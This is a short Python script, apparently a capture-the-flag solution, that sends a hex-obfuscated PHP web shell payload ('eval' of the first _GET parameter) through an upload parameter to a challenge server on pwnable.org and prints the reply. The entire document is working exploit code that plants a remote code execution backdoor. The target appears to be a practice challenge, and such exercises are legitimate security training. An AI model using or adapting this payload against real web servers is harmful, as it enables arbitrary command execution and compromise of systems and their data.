#!/usr/bin/env python3

import requests
import sys
import urllib


"""
<?;eval(${"\x5f\x47\x45\x54"}[0]);
"""
cmd = '<?;eval(${"\\x5f\\x47\\x45\\x54"}[0]);'

cmd = urllib.parse.quote_plus(cmd)

headers = {
    # Note: put your browser user-agent here to have the same behaviour here and in browser
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
}

url = 'http://pwnable.org:47780/?action=upload&data=' + cmd
print('URL:', url)

r = requests.get(url, headers=headers)
print('Status Code:', r.status_code)
print('Response:')
print(r.text)
